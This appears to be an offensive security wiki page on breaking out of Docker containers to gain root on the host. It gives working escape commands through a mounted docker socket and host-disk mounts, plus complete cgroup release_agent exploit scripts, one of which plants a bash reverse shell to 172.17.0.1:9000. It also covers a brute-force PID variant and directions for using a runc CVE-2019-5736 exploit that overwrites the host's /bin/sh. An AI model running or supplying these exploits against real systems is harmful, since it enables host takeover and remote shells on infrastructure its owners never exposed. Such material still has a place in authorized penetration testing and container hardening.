# Docker Breakout / Privilege Escalation

## Automatic Enumeration & Escape

* ****[**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): It can also **enumerate containers**
* ****[**CDK**](https://github.com/cdk-team/CDK#installationdelivery): This tool is pretty **useful to enumerate the container you are into even try to escape automatically**
* ****[**amicontained**](https://github.com/genuinetools/amicontained): Useful tool to get the privileges the container has in order to find ways to escape from it
* ****[**deepce**](https://github.com/stealthcopter/deepce): Tool to enumerate and escape from containers
* ****[**grype**](https://github.com/anchore/grype): Get the CVEs contained in the software installed in the image

## Mounted Docker Socket Escape

If somehow you find that the **docker socket is mounted** inside the docker container, you will be able to escape from it.\
This usually happen in docker containers that for some reason need to connect to docker daemon to perform actions.

```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```

In this case you can use regular docker commands to communicate with the docker daemon:

```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```

{% hint style="info" %}
In case the **docker socket is in an unexpected place** you can still communicate with it using the **`docker`** command with the parameter **`-H unix:///path/to/docker.sock`**
{% endhint %}

Docker daemon might be also [listening in a port (by default 2375, 2376)](../../../pentesting/2375-pentesting-docker.md) or on Systemd-based systems, communication with the Docker daemon can occur over the Systemd socket `fd://`.

{% hint style="info" %}
Additionally, pay attention to the runtime sockets of other high-level runtimes:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Capabilities Abuse Escape

You should check the capabilities of the container, if it has any of the following ones, you might be able to scape from it: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

You can check currently container capabilities using **previously mentioned automatic tools** or:

```bash
capsh --print
```

In the following page you can **learn more about linux capabilities** and how to abuse them to escape/escalate privileges:

{% content-ref url="../linux-capabilities.md" %}
[linux-capabilities.md](../linux-capabilities.md)
{% endcontent-ref %}

## Escape from Privileged Containers

A privileged container can be created with the flag `--privileged` or disabling specific defenses:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`

The `--privileged` flag introduces significant security concerns, and the exploit relies on launching a docker container with it enabled. When using this flag, containers have full access to all devices and lack restrictions from seccomp, AppArmor, and Linux capabilities. You can r**ead all the effects of `--privileged`** in this page:

{% content-ref url="docker-privileged.md" %}
[docker-privileged.md](docker-privileged.md)
{% endcontent-ref %}

### Mounting Disk

#### Poc1

Well configured docker containers won't allow command like **fdisk -l**. However on miss-configured docker command where the flag `--privileged` or `--device=/dev/sda1` with caps is specified, it is possible to get the privileges to see the host drive.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

So to take over the host machine, it is trivial:

```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```

And voilà ! You can now access the filesystem of the host because it is mounted in the `/mnt/hola` folder.

#### Poc2

Within the container, an attacker may attempt to gain further access to the underlying host OS via a writable hostPath volume created by the cluster. Below is some common things you can check within the container to see if you leverage this attacker vector:

```bash
#### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

#### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

#### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```

### Abusing release\_agent

{% code title="Initial PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# Enables notify_on_release in the cgroup
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent
# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c
# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
# Reads the output
cat /o
```
{% endcode %}

The following is a different version, more readable, of the previous script:

{% code title="Second PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Find an **explanation of the technique** in:

{% content-ref url="docker-breakout-privilege-escalation/docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-breakout-privilege-escalation/docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

&#x20;`--privileged` **provides far more permissions** than needed to escape a docker container via this method. In reality, the “only” requirements are:

1. We must be **running as root** inside the container
2. The container must be run with the **`SYS_ADMIN` Linux capability**
3. The container must lack an AppArmor profile, or otherwise allow the `mount` syscall
4. The cgroup v1 virtual filesystem must be mounted read-write inside the container

The `SYS_ADMIN` capability allows a container to perform the mount syscall (see [man 7 capabilities](https://linux.die.net/man/7/capabilities)). [Docker starts containers with a restricted set of capabilities](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) by default and does not enable the `SYS_ADMIN` capability due to the security risks of doing so.

Further, Docker [starts containers with the `docker-default` AppArmor](https://docs.docker.com/engine/security/apparmor/#understand-the-policies) policy by default, which [prevents the use of the mount syscall](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) even when the container is run with `SYS_ADMIN`.

A container would be vulnerable to this technique if run with the flags: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

### Abusing release\_agents without knowing relative path

In the previous exploits the **absolute path of the continer inside the hosts filesystem is disclosed**. However, this isn’t always the case. In cases where you **don’t know the absolute path of the continer inside the host** you can use this technique:

{% content-ref url="docker-breakout-privilege-escalation/release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](docker-breakout-privilege-escalation/release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}

```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID} :-("
      exit 1
    fi
  fi
  # Set the release_agent path to the guessed pid
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  # Trigger execution of the release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```

Executing the PoC within a privileged container should provide output similar to:

```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```

### Host Networking

If a container was configured with the Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), that container's network stack is not isolated from the Docker host (the container shares the host's networking namespace), and the container does not get its own IP-address allocated. In other words, the **container binds all services directly to the host's IP**. Furthermore the container can **intercept ALL network traffic that the host** is sending and receiving on shared interface `tcpdump -i eth0`.

For instance, you can use this to **sniff and even spoof traffic** between host and metadata instance.

Example:

* [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

### Sensitive Mounts

There are several files that might mounted that give **information about the underlaying host**. Some of them may even indicate **something to be executed by the host when something happens** (which will allow a attacker to escape from the container).\
The abuse of these files may allow that:

* release\_agent (already covered before)
* [binfmt\_misc](docker-breakout-privilege-escalation/sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](docker-breakout-privilege-escalation/sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](docker-breakout-privilege-escalation/sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](docker-breakout-privilege-escalation/sensitive-mounts.md#proc-sys-kernel-modprobe)

However, you can find **other sensitive files** to check for in this page:

{% content-ref url="docker-breakout-privilege-escalation/sensitive-mounts.md" %}
[sensitive-mounts.md](docker-breakout-privilege-escalation/sensitive-mounts.md)
{% endcontent-ref %}

### Runc exploit (CVE-2019-5736)

In case you can execute `docker exec` as root (probably with sudo), you try to escalate privileges escaping from a container abusing CVE-2019-5736 (exploit [here](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). This technique will basically **overwrite** the _**/bin/sh**_ binary of the **host** **from a container**, so anyone executing docker exec may trigger the payload.

Change the payload accordingly and build the main.go with `go build main.go`. The resulting binary should be placed in the docker container for execution.\
Upon execution, as soon as it displays `[+] Overwritten /bin/sh successfully` you need to execute the following from the host machine:

`docker exec -it <container-name> /bin/sh`

This will trigger the payload which is present in the main.go file.

For more information: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
There are other CVEs the container can be vulnerable too
{% endhint %}

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
